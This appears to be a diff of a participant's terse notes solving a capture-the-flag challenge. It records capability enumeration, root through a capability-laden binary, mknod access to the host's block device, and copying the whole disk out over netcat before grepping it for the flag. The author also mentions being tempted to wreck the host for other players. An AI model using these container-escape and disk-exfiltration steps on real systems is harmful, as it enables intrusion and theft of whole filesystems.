@@ -1,8 +1,7 @@
-http://13.52.10.63:8080/
-
-ps -ax | more
+bind 'set disable-completion on'
 bind 'set disable-completion off'
-cat .hint1
+bind "A":complete
+cat /home/.hint1
 
 We are badass, but we do (try to) playfair.
 
@@ -15,30 +14,102 @@ FSDOHQAGWTERYBVPICKLMNUXZ
 Good luck!
 
 
-THIS IS YOUR HINT LINUX IOURNAL FIVE SEVEN THREXE SEVEN
+THISISYOURHINT LINUX IOURNAL FIVE SEVEN THREXE SEVEN
 
 https://www.linuxjournal.com/article/5737
 
+capsh --print
 getcap /etc/*
+/etc/xash = cap_chown,cap_fowner,cap_kill,cap_setgid,cap_setuid+eip
 
 xash
+whoami 
+root
 
-VGhpcyBpcyBhIHBhZ2UgZnJvbSBhbiBvbGQgTGludXgga2VybmVsIG1hbnVhbCwgYnV0IHVuZm9ydHVuYXRlbHkgaXQgaXMKZW5jb2RlZC4KCldlIHdlcmUgdG9sZCB0aGUgZW5jcnlwdGlvbiB1c2VkIGlzIGEgbW9ub2FscGhhYmV0aWMgc3Vic3RpdHV0aW9uLCB0aGF0IG1hcHMKaW5kaXZpZHVhbCBjaGFyYWN0ZXJzIHRvIGEgbmV3IGNoYXJhY3RlciBvciBzeW1ib2wuIApNZXNzYWdlcyBlbmNvZGVkIHdpdGggbW9ub2FscGhhYmV0aWMgc3Vic3RpdHV0aW9uIGNpcGhlcnMgc2hvdyB0aGUgZXhhY3QgCnNhbWUgcGF0dGVybnMgaW4gbGV0dGVyIGZyZXF1ZW5jeSBhcyB0aGVpciBkZWNvZGVkIHZlcnNpb25zLiAKV2l0aCBhIHN1ZmZpY2llbnRseSBsb25nIG1lc3NhZ2UsIHlvdSBjYW4gcGVyZm9ybSB3aGF0J3MgY2FsbGVkIGEgCmZyZXF1ZW5jeSBhbmFseXNpcyB0byBtYWtlIGVkdWNhdGVkIGd1ZXNzZXMgb24gd2hpY2ggZW5jb2RlZCBjaGFyYWN0ZXJzIAptYXAgdG8gd2hpY2ggbGV0dGVycy4gCgoKCgoKCld2ZXJ4diBEc3Jndm9yaGcgWGxtZ2lsb292aQoKMS4gV3ZoeGlya2dybG06CgpSbmtvdm52bWcgeiB4dGlsZmsgZ2wgZ2l6eHAgem13IHZtdWxpeHYgbGt2bSB6bXcgbnBtbHcgaXZoZ2lyeGdybG1oCmxtIHd2ZXJ4diB1cm92aC4gIFogd3Zlcnh2IHh0aWxmayB6aGhseHJ6Z3ZoIHogd3Zlcnh2IHp4eHZoaApkc3Jndm9yaGcgZHJncyB2enhzIHh0aWxmay4gIFogZHNyZ3ZvcmhnIHZtZ2liIHN6aCA0IHVydm93aC4KJ2dia3YnIHJoIHogKHpvbyksIHggKHhzemkpLCBsaSB5ICh5b2x4cCkuICAnem9vJyBudnptaCByZyB6a2tvcnZoCmdsIHpvbyBnYmt2aCB6bXcgem9vIG56cWxpIHptdyBucm1saSBtZm55dmloLiAgTnpxbGkgem13IG5ybWxpIHppdgp2cmdzdmkgem0gcm1ndnR2aSBsaSAqIHVsaSB6b28uICBaeHh2aGggcmggeiB4bG5rbGhyZ3JsbSBsdSBpCihpdnp3KSwgZCAoZGlyZ3YpLCB6bXcgbiAobnBtbHcpLgoKR3N2IGlsbGcgd3Zlcnh2IHh0aWxmayBoZ3ppZ2ggZHJncyBpZG4gZ2wgJ3pvbycuICBaIHhzcm93IHd2ZXJ4dgp4dGlsZmsgdHZnaCB6IHhsa2IgbHUgZ3N2IGt6aXZtZy4gIFp3bnJtcmhnaXpnbGloIHh6bSBnc3ZtIGl2bmxldgp3dmVyeHZoIHVpbG4gZ3N2IGRzcmd2b3JoZyBsaSB6d3cgbXZkIHZtZ2lydmguICBaIHhzcm93IHh0aWxmayB4em0KbXZldmkgaXZ4dnJldiB6IHd2ZXJ4diB6eHh2aGggZHNyeHMgcmggd3ZtcnZ3IHliIHJnaCBreml2bWcuCgoyLiBGaHZpIFJtZ3ZpdXp4dgoKWm0gdm1naWIgcmggend3dncgZmhybXQgd3Zlcnh2aC56b29sZCwgem13IGl2bmxldncgZmhybXQKd3Zlcnh2aC53dm1iLiAgVWxpIHJtaGd6bXh2Cgp2eHNsICd4IDE6MyBuaScgPiAvaGJoL3VoL3h0aWxmay8xL3d2ZXJ4dmguem9vbGQKCnpvb2xkaCB4dGlsZmsgMSBnbCBpdnp3IHptdyBucG1sdyBnc3Ygd3Zlcnh2IGZoZnpvb2IgcG1sZG0gemgKL3d2ZS9tZm9vLiAgV2xybXQKCnZ4c2wgeiA+IC9oYmgvdWgveHRpbGZrLzEvd3Zlcnh2aC53dm1iCgpkcm9vIGl2bmxldiBnc3Ygd3Z1emZvZyAneiAqOiogaWRuJyB2bWdpYi4gV2xybXQKCnZ4c2wgeiA+IC9oYmgvdWgveHRpbGZrLzEvd3Zlcnh2aC56b29sZAoKZHJvbyB6d3cgZ3N2ICd6ICo6KiBpZG4nIHZtZ2liIGdsIGdzdiBkc3Jndm9yaGcuCgozLiBIdnhmaXJnYgoKWm1iIGd6aHAgeHptIG5sZXYgcmdodm91IHl2Z2R2dm0geHRpbGZraC4gIEdzcmggeG92emlvYiBkbG0nZwpoZnV1cnh2LCB5ZmcgZHYgeHptIHd2eHJ3diBnc3YgeXZoZyBkemIgZ2wgend2amZ6Z3ZvYiBpdmhnaXJ4ZwpubGV2bnZtZyB6aCBrdmxrb3YgdHZnIGhsbnYgdmNrdmlydm14diBkcmdzIGdzcmguICBEdiBuemIgcWZoZyBkem1nCmdsIGl2amZyaXYgWFpLX0hCSF9aV05STSwgZHNyeHMgemcgb3Z6aGcgcmggeiBodmt6aXpndiB5cmcgdWlsbgpYWktfTlBNTFcuICBEdiBuemIgZHptZyBnbCBxZmhnIGl2dWZodiBubGVybXQgZ2wgeiB4dGlsZmsgZHNyeHMKcmhtJ2cgeiB3dmh4dm13em1nIGx1IGdzdiB4Zmlpdm1nIGxtdi4gIExpIGR2IG56YiBkem1nIGdsIGZodgpYWktfTlpYX1pXTlJNLCBocm14diBkdiBpdnpvb2Igeml2IGdpYnJtdCBnbCBvbHhwIHdsZG0gaWxsZy4KClhaS19IQkhfWldOUk0gcmggbXZ2d3Z3IGdsIG5sd3J1YiBnc3YgZHNyZ3ZvcmhnIGxpIG5sZXYgem1sZ3N2aQpnemhwIGdsIHogbXZkIHh0aWxmay4gIChadHpybSBkdidvbyBraWx5enlvYiBkem1nIGdsIHhzem10diBnc3pnKS4KClogeHRpbGZrIG56YiBtbGcgeXYgdGl6bWd2dyBubGl2IGt2aW5yaGhybG1oIGdzem0gZ3N2IHh0aWxmaydoCmt6aXZtZyBzemguCgo0LiBTcnZpeml4c2IKCnd2ZXJ4diB4dGlsZmtoIG56cm1nenJtIHNydml6aXhzYiB5YiBuenBybXQgaGZpdiB6IHh0aWxmayBtdmV2aSBzemggbmxpdgp6eHh2aGgga3ZpbnJoaHJsbWggZ3N6bSByZ2gga3ppdm1nLiAgVmV2aWIgZ3JudiB6bSB2bWdpYiByaCBkaXJnZ3ZtIGdsCnogeHRpbGZrJ2ggd3Zlcnh2aC53dm1iIHVyb3YsIHpvbyByZ2ggeHNyb3dpdm0gZHJvbyBzemV2IGdzemcgdm1naWIgaXZubGV2dwp1aWxuIGdzdnJpIGRzcmd2b3JoZyB6bXcgem9vIGdzdiBvbHh6b29iIGh2ZyBkc3Jndm9yaGcgdm1naXJ2aCBkcm9vIHl2Cml2LXZlem9memd2dy4gIFJtIHh6aHYgbG12IGx1IGdzdiBvbHh6b29iIGh2ZyBkc3Jndm9yaGcgdm1naXJ2aCBkbGZvdyBraWxlcnd2Cm5saXYgenh4dmhoIGdzem0gZ3N2IHh0aWxmaydoIGt6aXZtZywgcmcnb28geXYgaXZubGV2dyB1aWxuIGdzdiBkc3Jndm9yaGcuCgpWY3pua292OgogICAgICBaCiAgICAgLyBcCiAgICAgICAgWQoKICAgIHRpbGZrICAgICAgICB5dnN6ZXJsaQl2Y3h2a2dybG1oCiAgICBaICAgICAgICAgICAgem9vbGQJInkgODoqIGlkbiIsICJ4IDExNjoxIGlkIgogICAgWSAgICAgICAgICAgIHd2bWIJInggMTozIGlkbiIsICJ4IDExNjoyIGlkbiIsICJ5IDM6KiBpZG4iCgpSdSB6IHd2ZXJ4diByaCB3dm1ydncgcm0gdGlsZmsgWjoKIyB2eHNsICJ4IDExNjoqIGkiID4gWi93dmVyeHZoLnd2bWIKcmcnb28ga2lsa3p0emd2IHdsZG0gem13IHp1Z3ZpIGl2ZXpvcnd6Z3JtdCBZJ2ggdm1naXJ2aCwgZ3N2IGRzcmd2b3JoZyB2bWdpYgoieCAxMTY6MiBpZG4iIGRyb28geXYgaXZubGV2dzoKCiAgICB0aWxmayAgICAgICAgZHNyZ3ZvcmhnIHZtZ2lydmggICAgICAgICAgICAgICAgICAgICAgICB3dm1ydncgd3Zlcnh2aAogICAgWiAgICAgICAgICAgIHpvbyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInkgODoqIGlkbiIsICJ4IDExNjoqIGlkIgogICAgWSAgICAgICAgICAgICJ4IDE6MyBpZG4iLCAieSAzOiogaWRuIiAgICAgICAgICAgICAgICAgem9vIGdzdiBpdmhnCgpSbSB4emh2IGt6aXZtZydoIHZjeHZrZ3JsbWggeHN6bXR2IHptdyBvbHh6byB2Y3h2a2dybG1oIHppdiBtbGcgem9vbGR2dwp6bWJubGl2LCBnc3ZiJ29vIHl2IHd2b3ZndncuCgpNbGdyeHYgZ3N6ZyBtdmQgZHNyZ3ZvcmhnIHZtZ2lydmggZHJvbyBtbGcgeXYga2lsa3p0emd2dzoKICAgICAgWgogICAgIC8gXAogICAgICAgIFkKCiAgICB0aWxmayAgICAgICAgZHNyZ3ZvcmhnIHZtZ2lydmggICAgICAgICAgICAgICAgICAgICAgICB3dm1ydncgd3Zlcnh2aAogICAgWiAgICAgICAgICAgICJ4IDE6MyBpZG4iLCAieCAxOjUgaSIgICAgICAgICAgICAgICAgICAgem9vIGdzdiBpdmhnCiAgICBZICAgICAgICAgICAgInggMTozIGlkbiIsICJ4IDE6NSBpIiAgICAgICAgICAgICAgICAgICB6b28gZ3N2IGl2aGcKCmRzdm0gend3cm10ICJ4ICo6MyBpZG4iOgojIHZ4c2wgInggKjozIGlkbiIgPlovd3Zlcnh2aC56b29sZAoKZ3N2IGl2aGZvZzoKICAgIHRpbGZrICAgICAgICBkc3Jndm9yaGcgdm1naXJ2aCAgICAgICAgICAgICAgICAgICAgICAgIHd2bXJ2dyB3dmVyeHZoCiAgICBaICAgICAgICAgICAgInggKjozIGlkbiIsICJ4IDE6NSBpIiAgICAgICAgICAgICAgICAgICB6b28gZ3N2IGl2aGcKICAgIFkgICAgICAgICAgICAieCAxOjMgaWRuIiwgInggMTo1IGkiICAgICAgICAgICAgICAgICAgIHpvbyBnc3YgaXZoZwoKeWZnIG1sZCByZydvbyB5diBrbGhocnlvdiBnbCB6d3cgbXZkIHZtZ2lydmggZ2wgWToKIyB2eHNsICJ4IDI6MyBpZG4iID5ZL3d2ZXJ4dmguem9vbGQKIyB2eHNsICJ4IDUwOjMgaSIgPlkvd3Zlcnh2aC56b29sZApsaSB2ZXZtCiMgdnhzbCAieCAqOjMgaWRuIiA+WS93dmVyeHZoLnpvb2xkCgpab29sZHJtdCBsaSB3dm1icm10IHpvbyB5YiBkaXJncm10ICd6JyBnbCB3dmVyeHZoLnpvb2xkIGxpIHd2ZXJ4dmgud3ZtYiBkcm9vCm1sZyB5diBrbGhocnlvdiBsbXh2IGdzdiB3dmVyeHYgeHRpbGZraCBzemggeHNyb3dpdm0uCgo0LjEgU3J2aXppeHNiIChybWd2aW16byBybmtvdm52bWd6Z3JsbSkKCnd2ZXJ4diB4dGlsZmtoIHJoIHJua292bnZtZ3Z3IHJtZ3ZpbXpvb2IgZmhybXQgeiB5dnN6ZXJsaSAoWk9PTEQsIFdWTUIpIHptdyB6Cm9yaGcgbHUgdmN4dmtncmxtaC4gIEdzdiBybWd2aW16byBoZ3pndiByaCB4bG1naWxvb3Z3IGZocm10IGdzdiBoem52IGZodmkKcm1ndml1enh2IGdsIGtpdmh2aWV2IHhsbmt6Z3J5cm9yZ2IgZHJncyBnc3Yga2l2ZXJsZmggZHNyZ3ZvcmhnLWxtb2IKcm5rb3Zudm1nemdybG0uICBJdm5sZXpvIGxpIHp3d3JncmxtIGx1IHZjeHZrZ3JsbWggZ3N6ZyBkcm9vIGl2d2Z4diBnc3Ygenh4dmhoCmdsIHd2ZXJ4dmggZHJvbyB5diBraWxrenR6Z3Z3IHdsZG0gZ3N2IHNydml6aXhzYi4KVWxpIHZldmliIGtpbGt6dHpndncgdmN4dmtncmxtLCBnc3YgdnV1dnhncmV2IGlmb3ZoIGRyb28geXYgaXYtdmV6b2Z6Z3Z3IHl6aHZ3CmxtIHhmaWl2bWcga3ppdm1nJ2ggenh4dmhoIGlmb3ZoLgoK
+cat /.hint2
 
+mount
 
-
-
+cat /etc/host1
 54.193.121.32
 
-13.56.195.185
 
-mount: You are on the right path, hacker.
-A hint is available for you from 54.193.121.32
+c 1:5 rwm
+c 1:3 rwm
+c 1:9 rwm
+c 1:8 rwm
+c 5:0 rwm
+c 5:1 rwm
+b 202:2 rwm /dev/xvda2
+Xen Virtual Block Device
+    0 = /dev/xvda       First Xen VBD whole disk
+    16 = /dev/xvdb      Second Xen VBD whole disk
+    32 = /dev/xvdc      Third Xen VBD whole disk
+      ...
+    240 = /dev/xvdp     Sixteenth Xen VBD whole disk
+c *:* m
+b *:* m
+c 1:7 rwm
 
+c 136:* rwm
+Unix98 PTY slaves
+    0 = /dev/pts/0	First Unix98 pseudo-TTY
+    1 = /dev/pts/1	Second Unix98 pseudo-TTY
 
-mount: /mnt/b: cannot mount /mnt/a read-only.
+c 5:2 rwm
+c 10:200 rwm    dev/net/tun
 
-stat -c "%A %a %t %T %n" *
+ mount -t cifs -o noperm //54.193.121.32/ /mnt/a
 
+stat -c "%A %a %n %t %T" *
 
-https://www.kernel.org/doc/Documentation/admin-guide/devices.txt
+print_folder_recurse() {
+    for i in "$1"/*;do
+        if [[ $i =~ .*proc.* ]]
+        then
+            continue
+        fi
+        if [[ $i =~ .*subsystem.* ]]
+        then
+            continue
+        fi
+        if [[ $i =~ .*/sys/bus/acpi/devices/.* ]]
+        then
+            continue
+        fi
+        if [[ $i =~ .*/sys/block/.* ]]
+        then
+            continue
+        fi
+        
+        
+        
+        
+        if [ -d "$i" ];then
+            print_folder_recurse "$i"
+        elif [ -f "$i" ]; then
+            stat -c "%A %t %T %n" $i
+        fi
+    done
+}
+
+mknod /dev/xvda2 b 202 2
+
+apt install netcat
+apt-get install binutils
+
+; copy the block device locally.
+dd if=/dev/xvda2 | gzip -9 | nc -l 3333
+
+nc [destination] 3333 | pv -b > hdImage.img.gz
+
+; Searching for the flag..
+cat /dev/xvda2 | grep -a "arkcon{"
+
+I also had write access to the device and binwalk showed that this is actually the host device's FS (https://github.com/yudai/gotty) :)
+
+which I guess was the purpose of the challenge but I didnt use the PING flag so much.. stil dont know what it ment..
+
+I guess having write access to the FS of the host also ment being able to destroy the challenge for everybody else which was kind of tempting because of the prize...
+
+** this challenge's author is a mistery to me...
